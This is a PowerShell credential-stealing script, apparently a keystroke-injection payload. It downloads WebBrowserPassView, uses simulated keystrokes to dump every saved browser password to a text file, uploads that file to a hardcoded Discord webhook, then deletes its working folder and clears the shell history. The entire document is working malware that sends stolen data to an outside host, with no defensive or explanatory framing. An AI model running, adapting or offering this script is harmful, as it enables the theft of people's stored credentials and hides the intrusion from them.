$URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"
$fileName = "pwds.txt"
$filePath = "C:\temp\" + $fileName
$wshell = New-Object -ComObject wscript.shell;

mkdir \temp | Out-Null
cd \temp
iwr -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip | Out-Null
iwr -uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip | Out-Null
Expand-Archive 7z.zip | Out-Null
.\7z\7za.exe e wbpv.zip -pwbpv28821@ -y | Out-Null
.\WebBrowserPassView.exe

Sleep 4

$wshell.AppActivate('WebBrowserPassView') | Out-Null
Sleep 1
$wshell.SendKeys("^{a}")
Sleep 1
$wshell.SendKeys("^{s}")
Sleep 2
$wshell.SendKeys($fileName)
Sleep 1
$wshell.SendKeys("~")
Sleep 2
$wshell.SendKeys("%{F4}")
$boundary = [System.Guid]::NewGuid().ToString()
$headers = @{
    "Content-Type" = "multipart/form-data; boundary=$boundary"
}

$body = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$(Split-Path -Leaf $filePath)"
Content-Type: application/octet-stream

$(Get-Content -Raw $filePath)
--$boundary--
"@

Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $body | Out-Null
cd ..
rm -R \temp
Clear-History
